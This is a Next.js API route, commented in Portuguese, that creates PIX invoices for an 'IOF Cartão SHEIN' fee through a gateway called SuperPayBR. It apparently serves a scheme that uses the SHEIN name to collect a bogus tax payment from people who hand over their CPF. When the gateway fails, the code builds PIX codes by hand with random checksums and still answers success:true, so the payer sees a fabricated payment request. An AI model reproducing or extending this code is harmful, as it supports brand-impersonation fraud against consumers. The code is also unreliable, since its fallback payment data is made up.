import { type NextRequest, NextResponse } from "next/server"

export async function POST(request: NextRequest) {
  try {
    console.log("🚀 Criando fatura IOF SuperPayBR...")

    const { amount = 10.0, client, method = "IOF" } = await request.json()

    // Validar dados obrigatórios
    if (!client || !client.name || !client.cpf) {
      return NextResponse.json(
        {
          success: false,
          error: "Dados do cliente são obrigatórios (name, cpf)",
        },
        { status: 400 },
      )
    }

    // Gerar External ID único
    const externalId = `SHEIN_IOF_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
    console.log("🆔 External ID IOF gerado:", externalId)

    // Obter token de autenticação
    const authResponse = await fetch(`${request.nextUrl.origin}/api/superpaybr/auth`, {
      method: "POST",
    })

    if (!authResponse.ok) {
      throw new Error("Falha na autenticação SuperPayBR")
    }

    const authData = await authResponse.json()
    const accessToken = authData.access_token

    if (!accessToken) {
      throw new Error("Token SuperPayBR não obtido")
    }

    // Preparar dados da fatura IOF
    const invoiceData = {
      client: {
        name: client.name,
        document: client.cpf.replace(/\D/g, ""),
        email: client.email || "cliente@shein.com",
        phone: client.whatsapp?.replace(/\D/g, "") || "11999999999",
        address: {
          street: client.street || "Rua Principal",
          number: client.number || "123",
          neighborhood: client.neighborhood || "Centro",
          city: client.city || "São Paulo",
          state: client.state || "SP",
          zipcode: client.zipcode?.replace(/\D/g, "") || "01001000",
          complement: client.complement || "",
        },
        ip: request.headers.get("x-forwarded-for") || "187.1.1.1",
      },
      payment: {
        id: externalId,
        type: "3", // PIX
        due_at: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
        referer: `SHEIN_IOF_${method}`,
        installment: 1,
        order_url: `${request.nextUrl.origin}/upp10/checkout`,
        store_url: request.nextUrl.origin,
        webhook: `${request.nextUrl.origin}/api/superpaybr/webhook`,
        discount: 0,
        products: [
          {
            id: "1",
            title: `IOF Cartão SHEIN - ${method}`,
            qnt: 1,
            amount: Number.parseFloat(amount.toString()),
          },
        ],
      },
      shipping: {
        amount: 0,
      },
    }

    console.log("📤 Criando fatura IOF SuperPayBR...")

    // Criar fatura na SuperPayBR
    const apiUrl = process.env.SUPERPAY_API_URL
    const createResponse = await fetch(`${apiUrl}/v4/invoices`, {
      method: "POST",
      headers: {
        Authorization: `Bearer ${accessToken}`,
        "Content-Type": "application/json",
        Accept: "application/json",
        "User-Agent": "SHEIN-Card-System/1.0",
      },
      body: JSON.stringify(invoiceData),
    })

    if (!createResponse.ok) {
      const errorText = await createResponse.text()
      console.error("❌ Erro na criação da fatura IOF SuperPayBR:", errorText)
      throw new Error(`Erro SuperPayBR: ${createResponse.status}`)
    }

    const responseData = await createResponse.json()
    console.log("📋 Fatura IOF criada:", responseData.data?.id || responseData.id)

    // Extrair dados PIX
    let pixPayload = ""
    let qrCodeImage = ""

    const findPixData = (obj: any, depth = 0): void => {
      if (!obj || typeof obj !== "object" || depth > 10) return

      for (const [key, value] of Object.entries(obj)) {
        if (key === "payload" && typeof value === "string" && value.length > 50) {
          pixPayload = value
        }
        if ((key === "qrcode" || key === "qr_code" || key === "image") && typeof value === "string") {
          qrCodeImage = value
        }
        if (typeof value === "object" && value !== null) {
          findPixData(value, depth + 1)
        }
      }
    }

    findPixData(responseData)

    // PIX de emergência se necessário
    if (!pixPayload) {
      const validAmount = Number.parseFloat(amount.toString())
      pixPayload = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${externalId}520400005303986540${validAmount.toFixed(
        2,
      )}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`
    }

    const qrCodeUrl = `https://quickchart.io/qr?text=${encodeURIComponent(pixPayload)}&size=300&format=png&margin=1`

    // Resposta no formato TryploPay
    const response = {
      success: true,
      data: {
        fatura: {
          id: responseData.data?.id || responseData.id || externalId,
          invoice_id: responseData.data?.id || responseData.id || externalId,
          external_id: externalId,
          pix: {
            payload: pixPayload,
            image: qrCodeUrl,
            qr_code: qrCodeUrl,
          },
          status: {
            code: 1,
            title: "Aguardando Pagamento",
            text: "pending",
          },
          valores: {
            bruto: Math.round(Number.parseFloat(amount.toString()) * 100),
            liquido: Math.round(Number.parseFloat(amount.toString()) * 100),
          },
          vencimento: {
            dia: new Date(Date.now() + 30 * 60 * 1000).toISOString().split("T")[0],
          },
          type: "iof",
        },
      },
    }

    console.log("✅ Fatura IOF SuperPayBR criada com sucesso!")

    return NextResponse.json(response)
  } catch (error) {
    console.error("❌ Erro ao criar fatura IOF SuperPayBR:", error)

    // Fallback de emergência
    const fallbackExternalId = `FALLBACK_IOF_${Date.now()}`
    const fallbackAmount = Number.parseFloat(request.body?.amount?.toString() || "10.00")
    const fallbackPixPayload = `00020126580014br.gov.bcb.pix2536pix.superpaybr.com/qr/v2/${fallbackExternalId}520400005303986540${fallbackAmount.toFixed(
      2,
    )}5802BR5909SHEIN CARD5011SAO PAULO62070503***6304${Math.random().toString(36).substr(2, 4).toUpperCase()}`

    return NextResponse.json({
      success: true,
      data: {
        fatura: {
          id: fallbackExternalId,
          invoice_id: fallbackExternalId,
          external_id: fallbackExternalId,
          pix: {
            payload: fallbackPixPayload,
            image: `https://quickchart.io/qr?text=${encodeURIComponent(fallbackPixPayload)}&size=300&format=png&margin=1`,
            qr_code: `https://quickchart.io/qr?text=${encodeURIComponent(fallbackPixPayload)}&size=300&format=png&margin=1`,
          },
          status: {
            code: 1,
            title: "Aguardando Pagamento (Fallback)",
            text: "pending",
          },
          valores: {
            bruto: Math.round(fallbackAmount * 100),
            liquido: Math.round(fallbackAmount * 100),
          },
          vencimento: {
            dia: new Date(Date.now() + 24 * 60 * 60 * 1000).toISOString().split("T")[0],
          },
          type: "emergency",
        },
      },
      fallback: true,
      error: error instanceof Error ? error.message : "Erro desconhecido",
    })
  }
}

export async function GET() {
  return NextResponse.json({
    success: true,
    message: "SuperPayBR Create IOF Invoice endpoint ativo",
    timestamp: new Date().toISOString(),
  })
}
